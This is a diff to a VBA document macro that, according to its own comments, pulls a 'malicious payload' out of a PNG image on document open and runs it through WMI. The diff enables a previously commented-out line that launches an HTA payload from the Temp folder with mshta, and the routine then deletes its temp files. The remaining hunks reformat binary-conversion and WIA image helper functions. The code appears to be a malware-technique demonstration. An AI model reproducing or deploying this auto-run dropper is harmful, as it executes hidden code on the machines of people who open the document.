@@ -13,7 +13,6 @@ End Sub
 
 Sub Document_Open()
     On Error GoTo Error_Handler
-    ' Variable Declarations
     Dim TempPath As String
     Dim TempFilePath As String
     Dim DocName As String
@@ -56,18 +55,19 @@ Sub Document_Open()
     CreatedImageBMPFilePath = Environ("Temp") & "\" & Left(imageFileName, InStrRev(imageFileName, ".")) & Ext1
     ' Extract the malicious  payload from the png host
     ' This is not an in-built function. The function itself was obtained from malware dumps online
-    ' But it doesn't seem to work. I am looking into the conversion mechanism to see what could be
+    ' but it doesn't seem to work. I am looking into the conversion mechanism to see what could be
     ' the case.
     Call WIA_ConvertImage(CreatedImageFilePath, CreatedImageBMPFilePath)
 
     Set objWMIService = GetObject(Calc)
-    ' FIXME: For some reason, Value & " " & CreatedImageBMPFilePath doesn't work, the string concatenation fails
+    ' For some reason, Value & " " & CreatedImageBMPFilePath doesn't work, the string concatenation fails
     ' when concatenating Value & " " & TempPath ... and simply results in Value being the output.
     objWMIService.Create Value & " " & CreatedImageBMPFilePath
 
-    ' As a workaround for demonstration purposes the following can be used,
+    ' As a workaround for demonstration purposes the following can be used.
     ' Placing the HTA payload in a separate file and providing its path here
-    ' objWMIService.Create "mshta" & " " & Environ(Temp) & "\" & "index.zip"
+    ' side-steps the failing extraction through WIA_ConvertImage
+    objWMIService.Create "mshta" & " " & Environ(Temp) & "\" & "index.zip"
 
     Kill TempPath & "\*.*"
     RmDir TempPath
@@ -175,8 +175,7 @@ End Function
 ' Author: Randy Birch (MVP Visual Basic)
 ' NOTE: You can limit the size of the returned
 '              answer by specifying the number of bits
-Function Dec2Bin(ByVal DecimalIn As Variant,
-              Optional NumberOfBits As Variant) As String
+Function Dec2Bin(ByVal DecimalIn As Variant, Optional NumberOfBits As Variant) As String
     Dec2Bin = ""
     DecimalIn = Int(CDec(DecimalIn))
     Do While DecimalIn <> 0
@@ -187,8 +186,7 @@ Function Dec2Bin(ByVal DecimalIn As Variant,
         If Len(Dec2Bin) > NumberOfBits Then
             Dec2Bin = "Error - Number exceeds specified bit size"
         Else
-            Dec2Bin = Right$(String$(NumberOfBits,
-                      "0") & Dec2Bin, NumberOfBits)
+            Dec2Bin = Right$(String$(NumberOfBits, "0") & Dec2Bin, NumberOfBits)
         End If
     End If
 End Function
@@ -198,8 +196,7 @@ End Function
 Function Bin2Dec(BinaryString As String) As Variant
     Dim X As Integer
     For X = 0 To Len(BinaryString) - 1
-        Bin2Dec = CDec(Bin2Dec) + Val(Mid(BinaryString,
-                  Len(BinaryString) - X, 1)) * 2 ^ X
+        Bin2Dec = CDec(Bin2Dec) + Val(Mid(BinaryString, Len(BinaryString) - X, 1)) * 2 ^ X
     Next
 End Function
 
@@ -209,7 +206,7 @@ End Function
 Public Function WIA_ConvertImage(sInitialImage As String, sOutputImage As String, Optional lQuality As Long = 85) As Boolean
     On Error GoTo Error_Handler
     Dim oWIA As Object   'WIA.ImageFile
-    Dim oIP As Object   'ImageProcess
+    Dim oIP As Object    'ImageProcess
     Dim sFormatID As String
     Dim sExt As String
     sFormatID = "{B96B3CAB-0728-11D3-9D7B-0000F81EF32E}"
